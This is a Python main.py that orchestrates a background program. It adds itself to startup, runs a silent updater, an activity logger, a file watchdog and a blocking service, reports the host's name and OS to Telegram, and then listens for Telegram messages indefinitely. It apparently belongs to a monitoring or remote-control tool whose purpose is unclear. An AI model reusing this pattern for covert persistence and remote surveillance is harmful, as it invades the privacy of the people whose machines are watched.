# main.py
import sys
import os
import time
import socket
import platform
import threading
from datetime import datetime
from src.core.single_instance import ensure_single_instance
from src.core.file_monitor import start_file_watchdog
from src.services.telegram_client import TelegramClient
from src.utils.logger import setup_logger
from src.core.startup import add_to_startup
from src.core.network import wait_for_internet
from src.core.activity_logger import start_logging
from src.services.update_manager import UpdateManager
from src.database.database import init_db
from src.services.blocking_service import BlockingService
logger = setup_logger()
ENABLE_UPDATER = True

# 🔒 Ensure only one instance runs
mutex = ensure_single_instance()
if not mutex:
    logger.warning("Another instance is already running. Exiting.")
    sys.exit(0)


def get_executable_path():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)


def get_system_info() -> str:
    hostname = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()
    app_start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return (
        f"🖥 <b>System Started</b>\n"
        f"• Hostname: {hostname}\n"
        f"• OS: {os_name} {os_version}\n"
        f"• Time: {app_start_time}"
    )


# ===============================
# Safe Thread Wrappers
# ===============================

def safe_activity_logger():
    try:
        logger.info("Activity logger thread started")
        start_logging()
    except Exception:
        logger.exception("Activity logger crashed unexpectedly")


def safe_file_watchdog():
    try:
        logger.info("File watchdog thread started")
        start_file_watchdog()
    except Exception:
        logger.exception("File watchdog crashed unexpectedly")


def main():
    logger.info("Application started")

    # Initialize database
    init_db()
    exe_path = get_executable_path()
    # Register startup only when running as packaged EXE
    exe_path = get_executable_path()
    # Run Blocking services
    blocking_service = BlockingService()
    blocking_service.start()
    logger.info("Blocking Service is started")
    if getattr(sys, "frozen", False):
        add_to_startup(exe_path)

    # Give system some breathing room
    time.sleep(10)

    # Wait for internet
    if not wait_for_internet(timeout=90):
        logger.error("Startup aborted: No internet")
        return

    # Run updater only when packaged EXE
    if ENABLE_UPDATER and getattr(sys, 'frozen', False):
        logger.info("Checking for updates in background...")
        updater = UpdateManager(silent=True, logger=logger)
        updater.start()

    # Start background threads with names
    threading.Thread(
        target=safe_activity_logger,
        daemon=True,
        name="ActivityLoggerThread"
    ).start()

    threading.Thread(
        target=safe_file_watchdog,
        daemon=True,
        name="FileWatchdogThread"
    ).start()

    # Initialize Telegram client
    client = TelegramClient()

    # Send startup message
    if not client.send_message(get_system_info(), retries=5, delay=6):
        logger.error("Startup message failed after retries")
    else:
        logger.info("Startup message delivered successfully")

    time.sleep(5)

    # Enter persistent listener
    logger.info("Entering Telegram listener loop")
    client.listen_forever()


if __name__ == "__main__":
    try:
        main()
    except Exception:
        logger.critical("Fatal error occurred in main()", exc_info=True)
        sys.exit(1)